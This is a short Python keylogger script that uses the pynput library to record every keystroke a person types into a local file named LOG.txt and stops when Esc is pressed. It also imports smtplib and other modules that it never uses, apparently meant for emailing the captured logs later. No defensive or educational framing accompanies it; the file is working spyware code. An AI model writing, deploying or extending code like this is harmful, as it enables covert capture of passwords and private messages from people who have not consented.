from pynput.keyboard import Key, Listener
import smtplib
import os
import EasyCode
import time
def on_press(key):
    with open("LOG.txt", 'a') as file:
        if key == Key.space or key == Key.enter:
            file.write("\n")
        elif key == Key.backspace:
            file.write('\b'+"")       
        else:
            key = str(key)
            if "key" in key.lower():
                key = ""
            k = key.replace("\'", '')
            file.write(k)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

    """
    
    """










